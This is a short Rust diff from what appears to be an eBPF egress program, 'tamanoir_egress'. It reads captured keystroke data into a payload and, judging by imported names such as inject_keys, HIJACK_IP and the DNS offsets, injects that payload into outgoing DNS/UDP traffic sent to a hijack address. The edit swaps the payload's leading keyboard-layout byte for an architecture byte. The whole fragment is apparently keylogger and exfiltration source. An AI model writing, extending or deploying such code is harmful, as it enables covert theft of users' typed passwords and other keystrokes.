@@ -15,8 +15,8 @@ use network_types::{
 
 use crate::common::{
     inject_keys, load_bytes, store_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len,
-    UpdateType, BPF_ADJ_ROOM_NET, DATA, DNS_PAYLOAD_MAX_LEN, DNS_QUERY_OFFSET, HIJACK_IP,
-    KEYBOARD_LAYOUT, KEYS_PAYLOAD_LEN, TARGET_IP, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
+    UpdateType, ARCH, BPF_ADJ_ROOM_NET, DATA, DNS_PAYLOAD_MAX_LEN, DNS_QUERY_OFFSET, HIJACK_IP,
+    KEYS_PAYLOAD_LEN, TARGET_IP, UDP_DEST_PORT_OFFSET, UDP_OFFSET,
 };
 
 pub struct Buf {
@@ -36,7 +36,7 @@ pub fn tamanoir_egress(mut ctx: TcContext) -> i32 {
 
 fn read_keys() -> [u8; KEYS_PAYLOAD_LEN] {
     let mut res = [0u8; KEYS_PAYLOAD_LEN];
-    res[0] = unsafe { core::ptr::read_volatile(&KEYBOARD_LAYOUT) };
+    res[0] = unsafe { core::ptr::read_volatile(&ARCH) };
     for item in res.iter_mut().take(KEYS_PAYLOAD_LEN).skip(1) {
         *item = DATA.pop().unwrap_or_default();
     }
